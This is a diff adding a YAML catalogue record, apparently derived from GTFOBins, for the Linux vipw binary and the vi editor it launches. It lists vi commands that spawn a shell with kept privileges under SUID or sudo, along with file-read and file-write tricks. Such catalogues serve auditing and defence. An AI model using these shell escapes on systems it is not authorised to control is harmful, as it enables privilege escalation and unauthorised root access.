@@ -1,0 +1,132 @@
+id: gtfobins/vipw/inherit/suid
+type: binary
+platform: linux
+name: vipw
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: vipw
+  comment: Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.
+references:
+- https://gtfobins.github.io/gtfobins/vipw/
+- https://gtfobins.github.io/gtfobins/vi/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        vipw:
+          functions:
+            inherit:
+            - code: vipw
+              comment: Despite requiring superuser privileges to run, the editor is executed as the unprivileged
+                user.
+              contexts:
+                sudo: null
+                suid: null
+              from: vi
+        vi:
+          functions:
+            file-read:
+            - code: vi /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: 'vi /path/to/output-file
+
+                iDATA
+
+                ^[
+
+                w'
+              comment: Where `^[` is the escape key.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: vi -c ':!/bin/sh' /dev/null
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: vi -c ':shell'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: vi -c ':set shell=/bin/sh | shell'
+              contexts:
+                sudo: null
+                suid:
+                  code: vi -c ':set shell=/bin/sh\ -p | shell'
+                  shell: false
+                unprivileged: null
+            - code: vi -c :terminal /bin/sh
+              contexts:
+                sudo: null
+                suid:
+                  code: vi -c ':terminal /bin/sh -p'
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/vipw/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  - value: privilege-escalation
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:d90320ecba1db31a03f7423ecdba233c375d101242f1c5ca253c9638a6c477fd
